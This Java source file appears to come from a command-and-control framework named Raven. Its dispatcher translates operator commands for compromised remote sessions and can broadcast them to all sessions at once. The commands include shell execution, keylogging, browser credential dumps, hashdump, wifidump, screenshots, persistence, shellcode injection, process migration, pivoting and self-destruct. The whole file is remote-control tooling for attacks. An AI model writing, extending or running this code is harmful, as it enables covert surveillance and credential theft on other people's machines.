package com.raven.core.command;

import com.raven.core.database.TeamDatabase;
import com.raven.core.server.RavenServer;
import com.raven.core.session.Session;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;

public final class AgentCommandDispatcher {

    public record CommandResult(boolean Success, String Output, String Command) {}

    private final RavenServer   Server;
    private final TeamDatabase  Database;
    private final String        Operator;

    public AgentCommandDispatcher(RavenServer Server, TeamDatabase Database, String Operator) {
        this.Server   = Server;
        this.Database = Database;
        this.Operator = Operator;
    }

    public CommandResult Dispatch(int SessionId, String UserCommand) {
        if (Server == null || !Server.IsRunning())
            return new CommandResult(false, "server not running", UserCommand);

        Optional<Session> Opt = Server.GetSessions().Get(SessionId);
        if (Opt.isEmpty())
            return new CommandResult(false, "session-" + SessionId + " not found", UserCommand);

        Session S         = Opt.get();
        boolean IsRaw     = S.IsRawMode();
        boolean IsWindows = IsWindows(S);

        String[] Parts    = UserCommand.trim().split("\\s+", 2);
        String   Command  = Parts[0].toLowerCase();
        String   Args     = Parts.length > 1 ? Parts[1].trim() : "";

        String AgentCmd = IsRaw
                ? TranslateRaw(Command, Args, IsWindows)
                : TranslateRaven(Command, Args, IsWindows);

        if (AgentCmd == null)
            return new CommandResult(false,
                    "[!] '" + Command + "' has no valid translation for this target. Use 'exec <id> <raw cmd>' to send commands directly.",
                    UserCommand);

        CommandResult Result = Execute(SessionId, AgentCmd);
        Database.SaveCommandLog(SessionId, Operator, UserCommand, Result.Output(), Result.Success());
        return Result;
    }

    public Map<Integer, CommandResult> BroadcastDispatch(List<Integer> SessionIds, String UserCommand) {
        Map<Integer, CommandResult> Results = new LinkedHashMap<>();
        for (int Id : SessionIds) Results.put(Id, Dispatch(Id, UserCommand));
        return Results;
    }

    public Map<Integer, CommandResult> BroadcastAllDispatch(String UserCommand) {
        Map<Integer, CommandResult> Results = new LinkedHashMap<>();
        for (Session S : Server.GetSessions().GetAll()) Results.put(S.GetId(), Dispatch(S.GetId(), UserCommand));
        return Results;
    }

    private CommandResult Execute(int SessionId, String AgentCommand) {
        String[] Raw     = Server.ExecuteCommand(SessionId, AgentCommand);
        boolean  Success = Boolean.parseBoolean(Raw[0]);
        return new CommandResult(Success, Raw[1], AgentCommand);
    }

    private static boolean IsWindows(Session S) {
        String Os = S.GetOs();
        if (Os == null || Os.isBlank() || Os.equalsIgnoreCase("unknown")) return false;
        String L = Os.toLowerCase();
        return L.contains("win") || L.contains("windows");
    }

    private static String TranslateRaw(String Command, String Args, boolean IsWindows) {
        return switch (Command) {
            case "exec", "shell" -> Args.isBlank() ? null : Args;
            default              -> ResolveOsCommand(Command, Args, IsWindows, true);
        };
    }

    private static String TranslateRaven(String Command, String Args, boolean IsWindows) {
        return switch (Command) {
            case "exec"         -> Args.isBlank() ? null : Args;
            case "shell"        -> Args.isBlank() ? null : (IsWindows ? "cmd /c " : "sh -c ") + Args;
            case "ping"         -> "raven:ping";
            case "reconnect"    -> "raven:reconnect";
            case "self-destruct"-> "raven:selfdestruct";
            case "sleep"        -> Args.isBlank() ? null : "raven:sleep:" + Args;
            case "jitter"       -> Args.isBlank() ? null : "raven:jitter:" + Args;
            case "screenshot"   -> "raven:screenshot";
            case "download"     -> Args.isBlank() ? null : "raven:download:" + Args;
            case "upload"       -> Args.isBlank() ? null : "raven:upload:" + Args;
            case "keystroke"    -> {
                if (Args.equalsIgnoreCase("on"))  yield "raven:keylog:start";
                if (Args.equalsIgnoreCase("off")) yield "raven:keylog:stop";
                yield null;
            }
            case "dumpbrowsers" -> "raven:browserdump";
            case "spawn"        -> "raven:spawn";
            case "persist"      -> "raven:persist:"   + (Args.isBlank() ? "auto" : Args);
            case "unpersist"    -> "raven:unpersist:" + (Args.isBlank() ? "auto" : Args);
            case "portfwd"      -> Args.isBlank() ? null : "raven:portfwd:" + Args;
            case "socks"        -> Args.isBlank() ? null : "raven:socks:"   + Args;
            case "pivot"        -> Args.isBlank() ? null : "raven:pivot:"   + Args;
            case "shellcode"    -> Args.isBlank() ? null : "raven:shellcode:" + Args;
            case "migrate"      -> Args.isBlank() ? null : "raven:migrate:" + Args;
            default             -> ResolveOsCommand(Command, Args, IsWindows, false);
        };
    }

    private static String ResolveOsCommand(String Command, String Args, boolean IsWindows, boolean RawFallback) {
        return switch (Command) {
            case "ls" -> {
                String Path = Args.isBlank() ? "." : Args;
                yield CmdDispatchConfig.Resolve(IsWindows, "ls", "PATH", Path);
            }
            case "pwd" ->
                CmdDispatchConfig.Get(IsWindows, "pwd");
            case "cd" -> {
                if (Args.isBlank()) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "cd", "PATH", Args);
            }
            case "cat" -> {
                if (Args.isBlank()) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "cat", "FILE", Args);
            }
            case "head" -> {
                String[] P = Args.split("\\s+", 2);
                if (P[0].isBlank()) yield null;
                String Lines = P.length > 1 ? P[1] : "20";
                yield CmdDispatchConfig.Resolve(IsWindows, "head", "FILE", P[0], "LINES", Lines);
            }
            case "tail" -> {
                String[] P = Args.split("\\s+", 2);
                if (P[0].isBlank()) yield null;
                String Lines = P.length > 1 ? P[1] : "20";
                yield CmdDispatchConfig.Resolve(IsWindows, "tail", "FILE", P[0], "LINES", Lines);
            }
            case "rm" -> {
                if (Args.isBlank()) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "rm", "PATH", Args);
            }
            case "mkdir" -> {
                if (Args.isBlank()) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "mkdir", "PATH", Args);
            }
            case "cp" -> {
                String[] P = Args.split("\\s+", 2);
                if (P.length < 2) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "cp", "SRC", P[0], "DST", P[1]);
            }
            case "mv" -> {
                String[] P = Args.split("\\s+", 2);
                if (P.length < 2) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "mv", "SRC", P[0], "DST", P[1]);
            }
            case "chmod" -> {
                if (Args.isBlank()) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "chmod", "ARGS", Args);
            }
            case "find" -> {
                String[] P    = Args.split("\\s+", 2);
                if (P[0].isBlank()) yield null;
                String  Name  = P.length > 1 ? P[1] : "*";
                yield CmdDispatchConfig.Resolve(IsWindows, "find", "PATH", P[0], "NAME", Name);
            }
            case "grep" -> {
                String[] P = Args.split("\\s+", 2);
                if (P.length < 2) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "grep", "PATTERN", P[0], "FILE", P[1]);
            }
            case "hash" -> {
                String[] P    = Args.split("\\s+", 2);
                if (P[0].isBlank()) yield null;
                String   Algo = P.length > 1 ? P[1].toUpperCase() : "SHA256";
                yield CmdDispatchConfig.Resolve(IsWindows, "hash." + Algo.toLowerCase(), "FILE", P[0]);
            }
            case "searchfiles" -> {
                if (Args.isBlank()) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "searchfiles", "ARGS", Args);
            }
            case "runas" -> {
                String[] P = Args.split("\\s+", 3);
                if (P.length < 3) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "runas",
                        "USER", P[0], "PASS", P[1], "CMD", P[2]);
            }
            case "osquery" -> {
                if (Args.isBlank()) yield null;
                yield CmdDispatchConfig.Resolve(IsWindows, "osquery", "ARGS", Args);
            }
            case "whoami", "id", "hostname", "uname", "ps", "env", "netstat",
                 "ifconfig", "arp", "route", "users", "groups", "services",
                 "privcheck", "antivirus", "crontab", "clipboard",
                 "wifidump", "lastlog", "hashdump" ->
                CmdDispatchConfig.Get(IsWindows, Command);
            default ->
                RawFallback ? (Args.isBlank() ? Command : Command + " " + Args) : null;
        };
    }
}
